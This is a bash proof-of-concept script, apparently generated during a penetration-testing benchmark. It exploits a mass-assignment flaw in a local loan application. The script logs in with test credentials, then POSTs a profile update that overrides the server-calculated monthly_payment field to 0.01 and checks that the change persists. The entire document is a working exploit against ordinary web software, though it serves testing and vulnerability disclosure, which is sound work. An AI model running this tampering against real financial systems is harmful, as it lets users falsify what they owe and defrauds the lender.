#!/bin/bash
# POC: Demonstrates mass assignment vulnerability where authenticated users can directly modify the calculated monthly_payment field
# Target: ./repo
# Created: 2025-12-02T16:24:31.312Z
# Session: benchmark-XBEN-104-24-mioryccy

TARGET_URL="${1:-http://localhost:8080}"
COOKIES_FILE="/tmp/cookies_ma.txt"

echo "Mass Assignment Vulnerability POC"
echo "Target: $TARGET_URL"
echo ""

# Login
echo "Step 1: Logging in..."
LOGIN=$(curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$LOGIN" | tail -n1)
if [ "$HTTP_CODE" != "302" ]; then
    echo "Login failed with HTTP $HTTP_CODE"
    exit 1
fi
echo "Login successful"

# Get initial profile
echo ""
echo "Step 2: Getting current profile..."
PROFILE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/profile")

INITIAL=$(echo "$PROFILE" | grep -oP 'name="monthly_payment".*?value="\K[^"]+' | head -1)
echo "Initial monthly_payment value: $INITIAL"

# Attack - set monthly_payment to 0.01
echo ""
echo "Step 3: Attempting mass assignment (setting monthly_payment=0.01)..."

curl -s -b "$COOKIES_FILE" -X POST "$TARGET_URL/profile" \
  -d "name=John&lastname=Doe&email=john@example.com&loan_amount=10000.0&loan_term_months=60&monthly_payment=0.01" \
  -o /dev/null

# Verify
echo "Step 4: Verifying attack success..."
PROFILE2=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/profile")

NEW=$(echo "$PROFILE2" | grep -oP 'name="monthly_payment".*?value="\K[^"]+' | head -1)
echo "After attack monthly_payment value: $NEW"

if [ "$NEW" = "0.01" ]; then
    echo ""
    echo "VULNERABILITY CONFIRMED"
    echo "monthly_payment was successfully modified from $INITIAL to 0.01 via mass assignment"
    echo "The field should be calculated server-side but accepts arbitrary user input"
    exit 0
else
    echo "Attack verification failed - got $NEW instead of 0.01"
    exit 1
fi